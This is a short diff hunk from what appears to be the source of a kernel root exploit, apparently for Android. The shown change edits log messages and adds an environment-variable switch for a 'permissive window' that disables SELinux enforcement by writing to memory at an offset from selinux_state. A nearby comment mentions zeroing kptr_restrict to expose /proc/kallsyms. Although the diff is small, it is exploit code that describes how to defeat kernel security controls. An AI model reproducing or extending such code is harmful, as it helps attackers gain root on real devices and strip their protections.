@@ -7870,8 +7870,12 @@ static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
             printf("[-] direct root: permissive window failed\n");
             goto fail;
         }
-        printf("[!] permissive window opened at selinux_state-1 (fallback path; "
-               "one byte before selinux_state is touched)\n");
+        if (getenv("CVE99491_SEL_OPEN_LEGACY"))
+            printf("[!] permissive window opened at selinux_state-1 (LEGACY V1 "
+                   "word; may corrupt fields after enforcing)\n");
+        else
+            printf("[!] permissive window opened at selinux_state-7 (zero word; "
+                   "only the enforcing byte is changed)\n");
     }
 
     /* Optional: zero kptr_restrict so the ksud CLI can read /proc/kallsyms
